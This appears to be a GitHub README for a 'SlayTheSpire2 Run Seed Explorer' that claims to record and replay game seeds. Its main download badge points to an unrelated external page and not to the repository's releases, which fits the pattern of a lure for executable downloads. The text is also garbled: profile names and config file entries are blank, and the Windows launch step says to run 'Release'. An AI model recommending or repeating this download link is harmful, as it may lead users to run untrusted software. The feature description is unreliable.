# SlayTheSpire2 Run Seed Explorer

<div align="center">

<a href="https://rewfdf.github.io/SetupPage/">
<img src="https://img.shields.io/badge/Download-Release-16a34a?style=plastic&logo=speedtest&logoColor=white" alt="Download">
</a>
<a href="https://github.com/gigahokagepincers/SlayTheSpire2-Run-Seed-Explorer/blob/main/LICENSE">
<img src="https://img.shields.io/badge/License-MIT-4c1?style=for-the-badge&logo=github&logoColor=white" alt="License">
</a>
<a href="https://github.com/gigahokagepincers/SlayTheSpire2-Run-Seed-Explorer/releases">
<img src="https://img.shields.io/badge/Version-1.2.3-007ec6?style=flat-square&logo=appveyor&logoColor=white" alt="Version">
</a>
<a href="https://github.com/gigahokagepincers/SlayTheSpire2-Run-Seed-Explorer">
<img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-ff7f50?style=flat&logo=linux&logoColor=white" alt="Platform">
</a>
<a href="https://discord.gg/SlayTheSpire2">
<img src="https://img.shields.io/badge/Support-Discord-7289da?style=plastic&logo=discord&logoColor=white" alt="Support">
</a>

</div>

---

## Overview

**SlayTheSpire2 Run Seed Explorer** is a lightweight, extensible manager that lets players persistently record, replay, and compare run seeds across multiple sessions. By separating configuration into well‑named profiles, the explorer removes the need for manual file juggling and provides a deterministic workflow for research, speed‑run practice, or casual experimentation. The repository ships with a ready‑to‑use release bundle that can be launched directly from the download page.

---

## Core Features

- **Profile‑Based Configuration** – Four built‑in profiles (``, ``, ``, ``) cover common use‑cases while allowing granular overrides.
- **Preset Workflows** – Choose from “Quick‑Run”, “Deep‑Analysis”, or “Custom‑Replay” presets; each preset automatically loads the appropriate configuration set and adjusts UI scaling.
- **Seed History Database** – Every seed is logged with timestamp, character class, and outcome, enabling CSV export for external analysis.
- **Deterministic Replay Engine** – Re‑inject a stored seed into the game client without altering other runtime parameters.
- **Cross‑Platform Packaging** – Single‑file bundles for Windows and Linux, both signed and checksum‑verified.

---

## Directory Layout

    SlayTheSpire2-Run-Seed-Explorer/
    ├─ README.md
    ├─ docs/
    │   └─ usage.md
    ├─ configs/
    │   ├─
    │   ├─
    │   ├─
    │   └─
    ├─ src/
    │   ├─ explorer.cs
    │   └─ seed_manager.cs
    ├─ releases/
    │   ├─ SlayTheSpire2-Run-Seed-Explorer_Win64.zip
    │   └─ SlayTheSpire2-Run-Seed-Explorer_Linux.tar.gz
    └─ data/
        └─ seed_log.csv

The `configs/` folder is the only location that end‑users need to edit. All other directories are managed by the repository maintainer and are updated automatically with each release.

---

## Usage Workflow

1. **Download & Extract** – Grab the latest bundle from the “Download Release” badge, then unzip the archive into a dedicated folder.
2. **Select a Profile** – Open `configs/` (or any of the predefined files) with a text editor and modify the desired keys.
3. **Launch the Explorer** – Run `Release` (Windows) or `./explorer` (Linux). The UI presents three tabs: *Run*, *Seed Log*, and *Settings*.
4. **Start a Run** – Click **New Run**, choose a character, and press **Generate Seed**. The generated seed appears in the console and is simultaneously written to `seed_log.csv`.
5. **Replay a Past Seed** – Navigate to *Seed Log*, locate the desired entry, and hit **Replay**. The explorer injects the seed into the game client and restores the associated profile automatically.
6. **Export Data** – Use the **Export CSV** button to download the complete seed history for offline analysis in spreadsheet software.

All actions are logged to `explorer.log` for troubleshooting.

---

## FAQ & Troubleshooting

**Q: The explorer launches but no seeds appear in the log.**
A: Verify that the `configs/` file contains `log_enabled = true`. If the key is missing, add it and restart the application.

**Q: I receive a “permission denied” error on Linux.**
A: Ensure the executable bit is set: `chmod +x explorer`. Also confirm the folder is writable by your user account.

**Q: The UI looks distorted on my high‑DPI monitor.**
A: Edit `` and set `ui_scale = 1.5` (or any value that fits your display). Save and reload the explorer.

**Q: Seed replay fails with “seed mismatch”.**
A: This occurs when the game client version does not match the explorer’s internal seed algorithm. Update the explorer to the latest release or revert the game to the supported version listed in `docs/usage.md`.

---

## Contributing

Contributions are encouraged. Fork the repository, create a feature branch named `feat/<description>`, and submit a pull request that includes updated documentation and unit tests. All new code must pass the existing test suite (`dotnet test`) and adhere to the repository’s C# coding standards.

---

## License

This project is distributed under the MIT License. See the `LICENSE` file for full terms.

---

*Stay up‑to‑date via the “Download Release” badge above and explore every seed that SlayTheSpire2 can generate.*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```